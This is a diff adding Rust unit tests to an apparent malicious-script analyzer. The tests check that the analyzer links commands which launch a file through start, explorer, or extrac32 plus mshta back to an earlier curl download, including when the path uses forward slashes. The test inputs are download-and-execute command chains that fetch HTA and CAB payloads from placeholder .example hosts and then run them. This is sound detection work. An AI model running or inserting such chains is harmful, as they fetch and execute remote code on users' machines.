@@ -3187,6 +3187,27 @@ start .\payload.hta"#,
     }
 
     #[test]
+    fn start_slash_equivalent_local_target_resolves_prior_download_source_url() {
+        let report = analyze(
+            br#"curl -o C:\Temp\payload.hta https://start-slash-source.example/payload.hta
+start C:/Temp/payload.hta"#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "start C:/Temp/payload.hta"
+                            && url == "https://start-slash-source.example/payload.hta"
+                )
+            }),
+            "start slash-equivalent local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
         let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
@@ -12680,6 +12701,27 @@ explorer .\payload.hta"#,
     }
 
     #[test]
+    fn explorer_slash_equivalent_local_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\payload.hta https://explorer-slash-source.example/payload.hta
+explorer C:/Temp/payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "explorer C:/Temp/payload.hta"
+                            && url == "https://explorer-slash-source.example/payload.hta"
+                )
+            }),
+            "Explorer slash-equivalent target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
@@ -15637,6 +15679,28 @@ mshta dropped.hta"#,
                 )
             }),
             "extrac32 extracted artifact was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn extrac32_slash_equivalent_source_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\payload.cab https://extrac32-slash-source.example/payload.cab
+extrac32 /y C:/Temp/payload.cab dropped.hta
+mshta dropped.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta dropped.hta"
+                            && url == "https://extrac32-slash-source.example/payload.cab"
+                )
+            }),
+            "extrac32 slash-equivalent source artifact was not linked on later execution: {:?}",
             report.traits
         );
     }
